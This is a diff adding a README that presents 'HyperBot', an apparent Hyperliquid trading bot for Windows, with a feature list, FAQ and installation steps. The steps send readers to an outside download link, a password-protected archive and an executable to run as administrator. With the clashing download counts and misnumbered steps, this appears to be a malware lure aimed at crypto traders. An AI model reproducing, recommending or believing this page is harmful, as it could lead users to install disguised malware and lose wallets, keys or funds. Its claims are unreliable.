@@ -1,0 +1,56 @@
+# HyperBot — Hyperliquid Trading Bot 2026
+
+![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2.0-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-13M%2B-orange?style=flat-square)
+
+> **HyperBot — automated trading on Hyperliquid DEX with perp strategies and copy trading.**
+
+---
+
+## Features
+
+- ✅ Perpetual futures automation
+- ✅ Grid and DCA strategies
+- ✅ Copy top traders
+- ✅ Funding rate arbitrage
+- ✅ Risk management tools
+- ✅ API key management
+
+---
+
+## Requirements
+
+- Windows 10/11 (64-bit)
+- Hyperliquid account
+
+---
+
+## Installation
+
+1. Scroll down and click the **Download** button
+2. Extract with WinRAR or 7-Zip — enter the password when prompted
+3. The archive password is shown on the **download page**
+3. Right-click `LatestVersion.exe` and select **Run as administrator**
+4. Follow the on-screen instructions and click **Start**
+6. Done — enjoy!
+
+---
+
+## FAQ
+
+**Q: Perps?**
+A: Yes — automated perpetual futures with up to 50x leverage.
+
+**Q: Copy?**
+A: Yes — copy profitable Hyperliquid traders automatically.
+
+---
+
+## Downloads
+
+**Monthly downloads:** 1.3m+
+
+[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://forumconnect.uk/hyperbot19)
+
+---
+
+*Use for educational and research purposes only.*
